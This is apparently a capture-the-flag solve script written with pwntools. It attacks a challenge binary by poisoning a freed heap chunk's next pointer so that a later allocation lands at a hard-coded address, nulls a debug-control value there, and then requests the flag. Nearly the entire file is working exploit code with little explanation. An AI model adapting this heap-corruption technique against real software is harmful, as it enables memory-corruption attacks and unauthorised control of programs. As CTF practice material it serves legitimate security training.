from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.binary = chall = ELF("./puzzle_patched", checksec=False)

if args.REMOTE:
    p = remote("127.0.0.1", 5000)
elif args.GDB:
    p = gdb.debug([chall.path], env={})
else:
    p = process([chall.path], env={})

def enc(v):
    if isinstance(v, bytes):
        return v
    if isinstance(v, str):
        return v.encode()
    if isinstance(v, int):
        return str(v).encode()
    raise AssertionError()

def cmd(op, *args):
    p.recvuntil(b"enter command: ")
    p.send(op.encode())
    for a in args:
        p.send(b" " + enc(a))
    p.sendline()

def malloc(ind, size):
    return cmd("stand_create", ind, size, b"A")

def free(ind):
    return cmd("stand_delete", ind)

def scanf(ind, pay):
    return cmd("stand_rename", ind, pay)

def puts(ind):
    cmd("simulate", ind)
    p.recvuntil(b"AI ANALYSIS FOR ")
    return p.recvuntil(" 🤖".encode("utf-8"))


# secret_addr = chall.sym["g_debug_control"] + 266
secret_addr = 0x40630a
print(f"secret_addr: {hex(secret_addr)}")

size = 128
def null_qword(addr):
    malloc(0, size)
    malloc(1, size)
    free(0)
    free(1)
    input("cont?")
    scanf(1, pack(addr - 0x8))
    input("cont?")
    malloc(2, size)
    malloc(3, size)
    # 3 now contains secret but it gets discarded
    # malloc nulled out the second qword though

null_qword(secret_addr)
cmd("send_flag")
p.sendline(b"quit")

print(end=p.recvall().decode())

